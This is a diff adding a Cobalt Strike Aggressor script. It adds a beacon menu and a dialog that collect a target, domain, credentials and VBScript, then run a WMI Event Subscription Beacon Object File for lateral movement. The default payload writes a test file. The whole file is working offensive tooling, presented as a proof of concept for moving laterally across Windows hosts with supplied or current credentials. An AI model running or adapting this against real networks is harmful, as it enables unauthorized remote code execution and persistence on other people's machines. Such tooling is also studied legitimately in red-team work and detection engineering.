@@ -1,0 +1,71 @@
+
+sub callback {
+	local('$bid $handle $data $args $IsCurrent $username $password $target $command $domain $parameters');
+	println("Dialog was actioned. Button: $2 Values: $3");
+	
+	$target = $3['target'];
+	$username = $3['username'];
+	$password = $3['password'];
+	$domain = $3['domain'];
+	$vbscript = $3['vbscript'];
+	$bid = $3['bid'];
+
+	$string1 = "\\\\";
+	$string2 = "\\ROOT\\SUBSCRIPTION";
+
+	$target2 = $string1.$target.$string2;
+
+	#Parse args
+	if($username -eq ""){
+#you want to use the current user	
+	$IsCurrent = 0;
+		
+		} else {
+		$IsCurrent = 1;
+		}
+
+		# Figure out Arch of session
+		$barch = barch($bid);	
+		
+		#Read BOF
+		$handle = openf(script_resource("EventSub. $+ $barch $+ .o"));
+		$data   = readb($handle, -1);
+		closef($handle);
+		
+		#pack args
+		$args   = bof_pack($bid, "ZZZZZi", $target2, $domain, $username, $password, $vbscript, $IsCurrent);
+		
+		#annoucement
+		btask($bid, "Running WMI EventSub BOF PoC");
+				
+		#Execute it
+		beacon_inline_execute($bid, $data, "go", $args);
+	
+}
+
+
+sub OpenDcomDialog{
+	$dialog = dialog("WMI EventSub BoF", %(bid => $1, target => "",username => "", password => "", vbscript => "Set objFileToWrite = CreateObject(\"Scripting.FileSystemObject\").OpenTextFile(\"C:\\out3.txt\", 2, true) : objFileToWrite.WriteLine(\"testing\") : objFileToWrite.Close : Set objFileToWrite = Nothing"), &callback);
+		dialog_description($dialog, "BOF to move laterally using WMI Event Subscription. Empty user means current context. Currently only x64 works.");
+		drow_text($dialog, "target",  "Target:");
+		drow_text($dialog, "domain", "Domain:");
+		drow_text($dialog, "username", "Username:");
+		drow_text($dialog, "password", "Password:");
+		drow_text($dialog, "vbscript", "VBScript:");
+		dbutton_action($dialog, "Launch");		
+		dialog_show($dialog);
+}
+
+
+
+popup beacon_bottom {
+	menu "WMI EventSub BOF" {
+			item "WMI EventSub"{
+				local('$bid');
+	foreach $bid ($1) {
+		OpenDcomDialog($bid);
+	}
+
+			}
+		}	
+	}
